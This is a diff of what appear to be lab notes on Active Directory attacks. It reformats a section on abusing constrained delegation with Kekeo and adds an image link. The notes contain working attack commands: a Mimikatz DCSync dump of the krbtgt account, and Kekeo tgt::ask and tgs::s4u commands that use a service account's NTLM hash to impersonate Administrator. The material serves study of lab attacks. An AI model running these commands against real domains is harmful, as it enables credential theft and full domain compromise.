@@ -317,6 +317,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 - To abuse constrained delegation, we need to have access to the `websvc` account. If we have access to that account, it is possible to access the services listed in **msDS-AllowedToDelegateTo** of the `websvc` account as ANY user. The service account must also have the (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D) `UserAccountControl` attribute
 
 
+![](https://i.imgur.com/ezTsNOd.png)
+
 
 **_Example_**
 
@@ -341,24 +343,24 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 
 ## **Abusing with Kekeo**
 
-• Either plaintext password or NTLM hash/AES keys is required. We already have
-access to websvc's hash from dcorp-adminsrv
-• Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
+- Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
+- Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
 
 
-```
-kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local
-/rc4:cc098f204c5887eaa8253e7c2749156f
+```powershell
+kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
 ```
 
 
 
-• Using s4u from Kekeo, we request a TGS (steps 4 & 5):
-tgs::s4u
-/tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco
-rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
+- Using s4u from Kekeo, we request a TGS (steps 4 & 5):
+
+
+```powershell
+tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
 /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-
 mssql.dollarcorp.moneycorp.LOCAL
+```
 
 
 
